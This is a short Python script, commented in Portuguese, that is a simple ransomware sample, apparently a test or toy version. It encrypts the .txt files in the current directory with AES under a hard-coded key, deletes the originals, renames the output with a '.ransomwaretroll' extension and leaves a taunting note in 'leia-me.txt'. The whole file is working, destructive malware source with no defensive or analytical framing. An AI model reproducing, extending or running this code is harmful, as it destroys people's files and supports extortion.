import os
import pyaes

def encrypt_files_in_directory():
    # Mensagem para o arquivo leia-me.txt
    ransom_message = "voce foi atacado hahaha"

    # Chave de criptografia
    key = b"testeransomwares"

    # Lista de arquivos no diretório atual
    files = [f for f in os.listdir('.') if f.endswith('.txt') and f != "leia-me.txt"]

    for file_name in files:
        try:
            # Abrir o arquivo para leitura em modo binário
            with open(file_name, "rb") as file:
                file_data = file.read()

            # Criptografar o conteúdo do arquivo
            aes = pyaes.AESModeOfOperationCTR(key)
            crypto_data = aes.encrypt(file_data)

            # Salvar o arquivo criptografado com uma nova extensão
            new_file_name = f"{file_name}.ransomwaretroll"
            with open(new_file_name, "wb") as new_file:
                new_file.write(crypto_data)

            # Remover o arquivo original
            os.remove(file_name)

            print(f"Arquivo {file_name} criptografado com sucesso para {new_file_name}.")
        except Exception as e:
            print(f"Erro ao processar o arquivo {file_name}: {e}")

    # Criar o arquivo leia-me.txt com a mensagem de aviso
    with open("leia-me.txt", "w") as ransom_file:
        ransom_file.write(ransom_message)

    print("Processo concluído. Arquivo leia-me.txt criado.")

if __name__ == "__main__":
    encrypt_files_in_directory()
